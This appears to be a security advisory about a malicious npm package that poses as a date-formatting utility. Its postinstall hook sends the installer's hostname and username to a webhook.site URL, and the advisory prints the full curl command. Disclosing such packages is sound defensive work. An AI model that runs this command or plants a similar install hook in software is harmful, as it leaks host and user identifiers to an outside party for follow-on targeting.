summary: Package exfiltrates installer hostname and username to webhook.site at install time
details: On npm install, the package's postinstall lifecycle hook (package.json scripts.postinstall → `node postinstall.js`) unconditionally executes `curl https://webhook.site/bc3b633a-8e44-4dd7-b4d2-bd9e13739d98?h=$(hostname)&u=$(whoami)`, transmitting the installer's hostname and current OS username to an anonymous webhook.site collector. The package advertises itself as 'a simple date formatting utility' and exports only a trivial hello() function — there is no legitimate reason for it to phone home with host identifiers. webhook.site is an anonymous request-capture service commonly used as a low-effort exfiltration sink in supply-chain reconnaissance. The harm fires automatically on default install, providing the operator of the webhook URL a list of compromised hosts and login names suitable for follow-on targeting.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
